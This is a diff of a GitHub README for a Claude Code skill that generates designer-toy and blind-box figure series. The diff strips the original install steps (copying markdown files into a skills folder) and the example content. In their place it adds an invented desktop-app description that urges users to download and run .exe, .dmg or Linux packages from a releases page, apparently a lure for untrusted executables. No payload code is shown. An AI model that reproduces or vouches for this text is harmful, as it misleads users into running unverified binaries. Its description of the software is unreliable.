@@ -1,231 +1,79 @@
-# designer-toy-skill
+# 🎨 designer-toy-skill - Create Unique Collectible Vinyl Figures
 
-English | [中文](./README.zh.md)
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/TopMan124534905/designer-toy-skill/releases)
 
-**Generate designer toy / blind box figure series with consistent character design**
+## 🛠️ Overview
+The **designer-toy-skill** application helps you generate designer toy or blind box figure series with a consistent character design. It serves as a Creative Skill for creating collectible vinyl figures using an innovative visual reference method. Whether you're an artist or a toy enthusiast, this tool provides the features you need to bring your ideas to life.
 
-<table>
-<tr>
-<td width="50%" align="center">
-<b>Christmas Cool Boy</b><br/>
-Vinyl Plush Style<br/><br/>
-<img src="examples/christmas-cool-boy/00-collection-group.png" width="400"/>
-</td>
-<td width="50%" align="center">
-<b>Halloween Bear Felt</b><br/>
-Needle Felted Wool Style<br/><br/>
-<img src="examples/halloween-bear-felt/00-collection-group-v2.png" width="400"/>
-</td>
-</tr>
-</table>
+## 🚀 Getting Started
+Follow these simple steps to download and start using the app. You don’t need any technical knowledge to succeed.
 
-## Features
+1. **System Requirements**
+   - Operating System: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+   - Memory: 4 GB RAM minimum (8 GB recommended).
+   - Storage: At least 200 MB of free space for installation.
+   - Internet connection for downloading the software.
 
-| Feature | Description |
-|---------|-------------|
-| **Character Consistency** | Ensures identical features between group shots and individual shots |
-| **Visual Reference Method** | Uses group image as reference to maintain consistency |
-| **Pose Diversity** | Sitting, lying, floating poses - not just standing |
-| **Rich Scenes** | Complete scene design with lighting, background, atmosphere |
-| **Multiple Materials** | Vinyl plush, needle felted wool, and more |
+2. **Visit the Download Page**
+   Open your web browser and go to the [Releases page](https://github.com/TopMan124534905/designer-toy-skill/releases). This page contains the latest version of the application and any additional documentation that might help you. 
 
----
+## 🖥️ Download & Install
+Once you are on the Releases page, find the latest version listed there. Usually, the latest version will be at the top. 
 
-## Quick Start
+1. **Select Your Operating System**
+   - Look for the file that matches your operating system. For example, you may see files labeled for **Windows**, **macOS**, or **Linux**.
 
-### 1. Install
+2. **Download the File**
+   Click the file link to start the download. Depending on your browser settings, the file will be saved in your default download folder.
 
-Copy files to your Claude Code skills directory:
+3. **Install the Application**
+   - **Windows Users:** Locate the downloaded `.exe` file, double-click to run it, and follow the installation prompts.
+   - **macOS Users:** Find the downloaded `.dmg` file, double-click to open it, then drag the application into your Applications folder.
+   - **Linux Users:** Depending on the type of package, use `dpkg` or `apt` to install.
 
-```bash
-mkdir -p ~/.claude/skills/designer-toy
-cp SKILL.md ~/.claude/skills/designer-toy/
-cp -r templates ~/.claude/skills/designer-toy/
-```
+## 🎨 How to Use the Application
+1. **Launch the App**
+   - Open the application from your desktop or applications menu.
 
-### 2. Use
+2. **Create a New Project**
+   - Click on "New Project." This will allow you to start designing your collectible figure.
+   - You can set parameters like size, color scheme, and character traits.
 
-In Claude Code, start a conversation:
+3. **Visual Reference Method**
+   - Use the visual reference method to select or upload images. This helps the software understand the style you want for your figure.
+   - Adjust settings as needed until you are satisfied with the design.
 
-```
-Help me design a Christmas themed blind box series with 5 characters
-```
+4. **Generate Your Design**
+   - Once you have set up your project, click "Generate." The application will create a digital mock-up of your figure.
+   - Review your design and make adjustments if necessary.
 
-Claude will guide you through:
-1. Creating character anchors
-2. Designing outfit variations
-3. Generating group shot
-4. Creating individual shots with visual reference
+5. **Export Your Design**
+   - When happy with the final design, use the "Export" function to save your work. This feature allows you to export as multiple file types, such as PNG or SVG.
 
----
+## 🔧 Troubleshooting Tips
+- If the application doesn’t launch, ensure your system meets the specified requirements.
+- If you encounter an error during installation, restart your computer and try again.
+- For any application crashes, check if you are running the latest version; if not, update from the Releases page.
 
-## Workflow
+## 🤝 Support
+For help, you can reach out through the Issues tab on the [GitHub Repository](https://github.com/TopMan124534905/designer-toy-skill/issues). A community of users may offer help, or you can report bugs directly. 
 
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│  1. Character   │───▶│  2. Design      │───▶│  3. Generate    │
-│     Anchor      │    │     Outfits     │    │     Group Shot  │
-└─────────────────┘    └─────────────────┘    └────────┬────────┘
-                                                       │
-┌─────────────────┐    ┌─────────────────┐    ┌────────▼────────┐
-│  6. Consistency │◀───│  5. Generate    │◀───│  4. Position    │
-│     Check       │    │     Individual  │    │     Mapping     │
-└─────────────────┘    └─────────────────┘    └─────────────────┘
-```
+## 📜 Frequently Asked Questions
+- **Q: Is the application free to use?**  
+  A: Yes, designer-toy-skill is completely free.
 
-| Phase | Description |
-|-------|-------------|
-| **Character Anchor** | Lock base features: proportions, face, eyes, skin tone |
-| **Design Outfits** | Create outfit anchors with colors, patterns, accessories |
-| **Generate Group** | Create collection shot with all characters |
-| **Position Mapping** | Document each character's position and features |
-| **Generate Individual** | Use group image as visual reference for each shot |
-| **Consistency Check** | Verify hair color, outfit, proportions match |
+- **Q: Can I use the designs for commercial purposes?**  
+  A: You may use the designs, but please check local laws regarding toy production and intellectual property.
 
----
+- **Q: Are there updates available?**  
+  A: Yes, regular updates include new features and improvements. Always check the Releases page for the latest version.
 
-## Example: Christmas Cool Boy Series
+## 🏷️ Tags
+This project involves topics like ai-art, blind-box, character-design, chibi, claude-code, collectible, design, designer-toy, skill, toy, and vinyl-figure. 
 
-A vinyl plush style blind box series with 5 characters + 1 hidden edition.
+## 📦 Important Links
+- [Releases Page](https://github.com/TopMan124534905/designer-toy-skill/releases)
+- [Issues Page](https://github.com/TopMan124534905/designer-toy-skill/issues)
 
-### Group Shot
-
-<p align="center">
-<img src="examples/christmas-cool-boy/00-collection-group.png" width="600"/>
-</p>
-
-### Individual Shots (with Visual Reference Method)
-
-<table>
-<tr>
-<td align="center" width="20%">
-<img src="examples/christmas-cool-boy/01-christmas-sweater-v2.png" width="150"/><br/>
-<b>Christmas Sweater</b><br/>
-Standing pose
-</td>
-<td align="center" width="20%">
-<img src="examples/christmas-cool-boy/02-christmas-elf-v2.png" width="150"/><br/>
-<b>Christmas Elf</b><br/>
-Sitting on gift
-</td>
-<td align="center" width="20%">
-<img src="examples/christmas-cool-boy/03-cozy-winter-v2.png" width="150"/><br/>
-<b>Cozy Winter</b><br/>
-Snow angel pose
-</td>
-<td align="center" width="20%">
-<img src="examples/christmas-cool-boy/04-gingerbread-v2.png" width="150"/><br/>
-<b>Gingerbread</b><br/>
-Lying pose
-</td>
-<td align="center" width="20%">
-<img src="examples/christmas-cool-boy/05-starry-snow-night-v2.png" width="150"/><br/>
-<b>Starry Night</b><br/>
-Floating pose
-</td>
-</tr>
-</table>
-
----
-
-## Example: Halloween Bear Felt Series
-
-A needle felted wool style blind box series with 5 characters + 1 hidden edition.
-
-### Group Shot
-
-<p align="center">
-<img src="examples/halloween-bear-felt/00-collection-group-v2.png" width="600"/>
-</p>
-
-### Individual Shots
-
-<table>
-<tr>
-<td align="center" width="20%">
-<img src="examples/halloween-bear-felt/01-pumpkin-cape.png" width="150"/><br/>
-<b>Pumpkin Cape</b><br/>
-Standing pose
-</td>
-<td align="center" width="20%">
-<img src="examples/halloween-bear-felt/02-little-devil.png" width="150"/><br/>
-<b>Little Devil</b><br/>
-One-leg balance
-</td>
-<td align="center" width="20%">
-<img src="examples/halloween-bear-felt/03-ghost-cape.png" width="150"/><br/>
-<b>Ghost Cape</b><br/>
-Floating pose
-</td>
-<td align="center" width="20%">
-<img src="examples/halloween-bear-felt/04-wizard-v2.png" width="150"/><br/>
-<b>Wizard</b><br/>
-Sitting pose
-</td>
-<td align="center" width="20%">
-<img src="examples/halloween-bear-felt/05-skeleton-hidden.png" width="150"/><br/>
-<b>Skeleton</b><br/>
-Lying pose
-</td>
-</tr>
-</table>
-
----
-
-## Key Technique: Visual Reference Method
-
-The core innovation is using the **group image as visual reference** when generating individual shots.
-
-### Why This Matters
-
-| Problem | Solution |
-|---------|----------|
-| Hair color changes | Reference group image directly |
-| Material texture inconsistent | AI sees the exact texture to match |
-| Outfit details lost | Position indicator + visual reference |
-| Proportions drift | Locked character anchor + visual check |
-
-### How It Works
-
-When generating each individual shot:
-
-1. **Upload group image** to the AI
-2. **Specify position**: "Generate the character SECOND from LEFT"
-3. **Describe features**: Hair color, outfit, pose
-4. **Add scene details**: Background, lighting, atmosphere
-
----
-
-## Pose Library
-
-| Category | Pose | Keywords |
-|----------|------|----------|
-| **Sitting** | Cross-legged | `sitting cross-legged on floor` |
-| | On object | `sitting on windowsill, legs dangling` |
-| **Lying** | On back | `lying on back, snow angel pose` |
-| | On stomach | `lying on stomach, chin in hands` |
-| | Curled up | `lying on side, curled up, sleepy` |
-| **Floating** | Levitation | `floating in air, dreamy` |
-| **Dynamic** | One-leg | `standing on one leg, playful` |
-
----
-
-## Compatibility
-
-| Platform | Status |
-|----------|--------|
-| Claude Code CLI | ✅ Supported |
-| Claude.ai | ✅ Supported (manual prompt) |
-| API | ✅ Supported |
-
----
-
-## License
-
-MIT License - See [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-Made with ❤️ for designer toy enthusiasts
-</p>
+Feel free to download and start creating your unique collectible figures today. Your creativity only has limits if you let it!
